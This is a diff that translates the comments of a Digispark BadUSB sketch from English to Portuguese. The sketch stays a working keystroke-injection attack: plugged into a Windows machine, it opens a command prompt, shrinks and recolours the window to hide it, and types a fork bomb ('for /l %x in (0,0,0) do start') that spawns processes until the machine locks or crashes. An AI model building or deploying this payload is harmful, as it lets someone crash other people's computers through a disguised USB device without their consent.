@@ -1,4 +1,4 @@
-//This script opens up a Windows command prompt and makes it open up another instance of itself and so on until the machine can take it no more and either locks or crashes. Credits to BlackBoot.
+//Esse script abre um prompt de comando do Windows e o faz abrir outra instância de si mesmo e assim por diante até que a máquina não aguente mais e trave ou crashe. Créditos ao BlackBoot.
 #include "DigiKeyboard.h"
 void setup() {
 }
@@ -11,17 +11,17 @@ void loop() {
   DigiKeyboard.print("cmd");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
-  //Obfuscate the terminal
+  //Esconde o terminal
   DigiKeyboard.print("MODE CON: COLS=15 LINES=1");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(100);
   DigiKeyboard.print("COLOR EF");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  //Run the fork bomb
+  //Executa o Forkbomb
   DigiKeyboard.delay(500);
   DigiKeyboard.print(F("for /l %x in (0,0,0) do start"));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   for (;;) {
-    /*Stops the digispark from running the scipt again*/
+    /*Para o script*/
   }
 }
